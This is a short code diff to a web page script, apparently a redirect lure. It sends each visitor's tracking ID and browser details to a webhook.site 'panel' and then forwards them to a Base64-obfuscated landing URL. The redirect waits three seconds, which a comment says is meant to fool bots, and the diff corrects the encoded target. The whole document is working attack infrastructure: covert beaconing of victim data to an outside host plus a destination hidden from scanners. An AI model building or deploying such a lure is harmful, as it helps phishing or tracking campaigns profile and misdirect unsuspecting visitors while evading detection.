@@ -22,13 +22,13 @@
 
     <script>
         (function() {
-            // 1. YOUR PANEL: Your specific Webhook.site URL
+            // 1. YOUR PANEL
             const myPanel = "https://webhook.site/da2082dc-5f8f-418f-9ed4-122a6015ab92";
 
-            // 2. YOUR TARGET: Encoded in Base64 (https://izfyb.acesporty.com/secondproject/)
-            const encodedVault = "aHR0cHM6Ly9penZ5Yi5hY2VzcG9ydHkuY29tL3NlY29uZHByb2plY3Qv";
+            // 2. FIXED TARGET: Encoded version of https://izfyb.acesporty.com/landing/
+            // Note the "f" is now correct in the encoding below:
+            const encodedVault = "aHR0cHM6Ly9pemZ5Yi5hY2VzcG9ydHkuY29tL2xhbmRpbmcv";
 
-            // Get the User ID from the URL (e.g. ?id=123)
             const params = new URLSearchParams(window.location.search);
             const userID = params.get('id') || 'untracked_visitor';
 
@@ -38,13 +38,12 @@
                 mode: "no-cors",
                 body: JSON.stringify({
                     id: userID,
-                    user_agent: navigator.userAgent,
-                    platform: navigator.platform,
+                    agent: navigator.userAgent,
                     time: new Date().toLocaleString()
                 })
             });
 
-            // 3. THE REDIRECT: 3-second delay to fool basic bots
+            // 3. THE REDIRECT: 3-second delay
             setTimeout(() => {
                 window.location.replace(atob(encodedVault));
             }, 3000);
